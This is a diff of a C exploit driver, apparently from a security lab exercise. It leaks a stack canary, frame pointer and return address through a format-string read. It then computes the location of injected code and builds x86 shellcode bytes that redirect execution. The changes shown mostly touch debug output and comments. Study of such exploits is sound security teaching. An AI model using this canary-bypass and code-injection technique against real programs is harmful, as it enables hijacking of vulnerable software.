@@ -33,7 +33,7 @@ int from_child, to_child;
 void print_escaped(FILE *fp, const char* buf, unsigned len) {
    int i;
    int l=-3;
-   fprintf(stderr, "\n"); // empty line
+   fprintf(stderr, "\n%4d:", 0); // empty line
    for (i=0; i < len; i++) {
       if(i%4==2 && i%16==2)
          fprintf(stderr, "\n%4d:", l+=4);
@@ -167,19 +167,25 @@ int main(int argc, char* argv[]) {
 
    void *main_loop_ra, *main_loop_bp, *canary; // address of main_loop's return address
    get_formatted("%x%x%x", &canary, &main_loop_bp, &main_loop_ra); 
-   fprintf(stderr, "driver: Extracted canary: %x temp ebp: %x main_loop_ra: %x\n", 
+   fprintf(stderr, "driver: Extracted canary: %x main_loop_bp: %x main_loop_ra: %x\n", 
       (unsigned int) canary, 
       (unsigned int) main_loop_bp, 
       (unsigned int) main_loop_ra);
 
    // 2. Find the address of where the injected code will be located
-   //    This is necessary to return to this code.
+   //    This is necessary to return to injected code.
    void *code_loc = main_loop_bp - offset_auth_user_main_loop_bp ;
    fprintf(stderr, "driver: code_loc: 0x%x\n", (unsigned int) code_loc);
 
    // 3. Exploit
    // 3-1. Generate asm code
-   char code[] = { 0x89, 0xE8, 0x2D, 0x75, 0x04, 0x00, 0x00, 0xFF, 0xE0, 0x90 }; 
+   /* Used, https://defuse.ca/online-x86-assembler.html
+      as -a --32 seems to give different output
+   0:  89 e8                   mov    eax,ebp
+   2:  2d 75 04 00 00          sub    eax,0x475
+   7:  ff e0                   jmp    rax 
+   */
+   char code[] = { 0x89, 0xE8, 0x2D, 0x75, 0x04, 0x00, 0x00, 0xFF, 0xE0 }; 
    size_t len = 9;
    
    // 3-2. Prepare the payload
